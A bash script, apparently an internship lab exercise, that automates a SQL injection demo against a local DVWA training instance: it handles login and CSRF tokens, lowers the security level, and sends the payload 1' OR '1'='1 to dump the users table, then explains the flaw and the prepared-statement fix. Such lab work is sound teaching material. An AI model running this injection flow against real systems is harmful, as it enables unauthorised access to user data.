#!/bin/bash
#
# sql_injection_exploit.sh
#
# Oasis Infobyte Cybersecurity Internship - Task 3
# Demonstrates a classic SQL Injection vulnerability in DVWA (Damn Vulnerable
# Web Application) at "low" security level.
#
# WARNING: For educational use only, against a DVWA instance you own/control
# (e.g. on localhost / a local VM). Never run this against systems you do not
# have explicit authorization to test.
#
# What it does:
#   1. Logs into DVWA and captures the session cookie + CSRF token.
#   2. Sets the DVWA security level to "low".
#   3. Sends a normal request (id=1) to show baseline behavior.
#   4. Sends the SQL injection payload (1' OR '1'='1) to the vulnerable
#      SQL Injection page and shows that it dumps the entire users table.
#
# Usage:
#   ./sql_injection_exploit.sh [target_base_url] [username] [password]
#
#   Defaults:
#     target_base_url = http://localhost/DVWA
#     username         = admin
#     password         = password
#
# Requirements: curl, sed/grep (standard on Kali)

set -euo pipefail

BASE_URL="${1:-http://localhost/DVWA}"
USERNAME="${2:-admin}"
PASSWORD="${3:-password}"
COOKIE_JAR="$(mktemp)"

trap 'rm -f "$COOKIE_JAR"' EXIT

echo "==================================================================="
echo " DVWA SQL Injection Demo"
echo " Target : $BASE_URL"
echo " User   : $USERNAME"
echo "==================================================================="

# -----------------------------------------------------------------------
# Step 1: Get the login page to grab the CSRF token (user_token) & cookies
# -----------------------------------------------------------------------
echo "[*] Fetching login page for CSRF token..."
LOGIN_PAGE=$(curl -s -c "$COOKIE_JAR" "$BASE_URL/login.php")

CSRF_TOKEN=$(echo "$LOGIN_PAGE" | grep -oP "name='user_token' value='\K[^']+" || true)

if [ -z "$CSRF_TOKEN" ]; then
    echo "[!] Could not find CSRF token. Is DVWA running at $BASE_URL ?"
    exit 1
fi
echo "[+] CSRF token acquired: $CSRF_TOKEN"

# -----------------------------------------------------------------------
# Step 2: Log in
# -----------------------------------------------------------------------
echo "[*] Logging in as '$USERNAME'..."
curl -s -b "$COOKIE_JAR" -c "$COOKIE_JAR" \
    --data-urlencode "username=$USERNAME" \
    --data-urlencode "password=$PASSWORD" \
    --data-urlencode "Login=Login" \
    --data-urlencode "user_token=$CSRF_TOKEN" \
    "$BASE_URL/login.php" -o /dev/null

if grep -qi "PHPSESSID" "$COOKIE_JAR"; then
    echo "[+] Login successful, session established."
else
    echo "[!] Login may have failed - check credentials."
    exit 1
fi

# -----------------------------------------------------------------------
# Step 3: Force DVWA security level to "low"
# -----------------------------------------------------------------------
echo "[*] Setting DVWA security level to 'low'..."
SECURITY_PAGE=$(curl -s -b "$COOKIE_JAR" "$BASE_URL/security.php")
SEC_TOKEN=$(echo "$SECURITY_PAGE" | grep -oP "name='user_token' value='\K[^']+" || true)

curl -s -b "$COOKIE_JAR" -c "$COOKIE_JAR" \
    --data-urlencode "security=low" \
    --data-urlencode "seclev_submit=Submit" \
    --data-urlencode "user_token=$SEC_TOKEN" \
    "$BASE_URL/security.php" -o /dev/null
echo "[+] Security level set to low."

# -----------------------------------------------------------------------
# Step 4: Baseline request - normal, expected input
# -----------------------------------------------------------------------
echo
echo "[*] Baseline request with id=1 (expected: single user returned)..."
BASELINE=$(curl -s -b "$COOKIE_JAR" -G "$BASE_URL/vulnerabilities/sqli/" \
    --data-urlencode "id=1" \
    --data-urlencode "Submit=Submit")

echo "--- Baseline result ---"
echo "$BASELINE" | grep -A2 "First name" | sed 's/<[^>]*>//g' | sed '/^$/d'
echo "------------------------"

# -----------------------------------------------------------------------
# Step 5: The actual SQL injection payload
# -----------------------------------------------------------------------
PAYLOAD="1' OR '1'='1"
echo
echo "[*] Sending SQL injection payload: $PAYLOAD"
INJECTED=$(curl -s -b "$COOKIE_JAR" -G "$BASE_URL/vulnerabilities/sqli/" \
    --data-urlencode "id=$PAYLOAD" \
    --data-urlencode "Submit=Submit")

echo
echo "==================================================================="
echo " RESULT: Injected query dumped the following rows from 'users'"
echo "==================================================================="
echo "$INJECTED" | grep -A2 "First name" | sed 's/<[^>]*>//g' | sed '/^$/d'
echo "==================================================================="

USER_COUNT=$(echo "$INJECTED" | grep -c "First name" || true)
echo
echo "[+] Rows returned by baseline query : 1 (expected)"
echo "[+] Rows returned by injected query : $USER_COUNT"
echo
echo "[!] VULNERABILITY CONFIRMED: user input is concatenated directly into"
echo "    the SQL query (WHERE user_id = '\$id'), so the payload"
echo "    1' OR '1'='1 turns the WHERE clause into a tautology, causing the"
echo "    query to return every row in the users table instead of one."
echo
echo "    Fix: use parameterized queries / prepared statements and validate"
echo "    that 'id' is numeric before using it in a query."
